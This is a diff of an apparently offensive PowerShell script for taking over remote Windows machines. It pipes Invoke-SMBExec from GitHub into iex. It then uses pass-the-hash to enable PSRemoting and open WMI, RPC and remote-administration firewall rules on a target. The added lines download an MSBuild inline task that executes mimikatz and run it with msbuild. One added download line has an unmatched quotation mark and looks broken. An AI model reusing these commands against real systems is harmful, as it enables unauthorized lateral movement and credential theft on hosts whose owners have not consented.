@@ -82,10 +82,10 @@ function ConvertFrom-SecureToPlain {
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose -ErrorAction SilentlyContinue
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose -ErrorAction SilentlyContinue
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose -ErrorAction SilentlyContinue
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose -ErrorAction SilentlyContinue }
+        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose 
+        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose 
+        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose 
+        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose }
         
 	'3' {
         Write-Host ""
@@ -128,8 +128,8 @@ function ConvertFrom-SecureToPlain {
       } until ($input -in '1','2','3','4')
 
 
-if(Test-Path variable:global:PassTheHash) { Write-Host ""
-$RDP = New-PSSession -Computer $computer -Authentication Kerberos } else { Write-Host ""
+if(Test-Path variable:global:PassTheHash) { Invoke-WebRequest -Uri https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml" -Outfile SimpleTasks.csproj
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe } else { Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
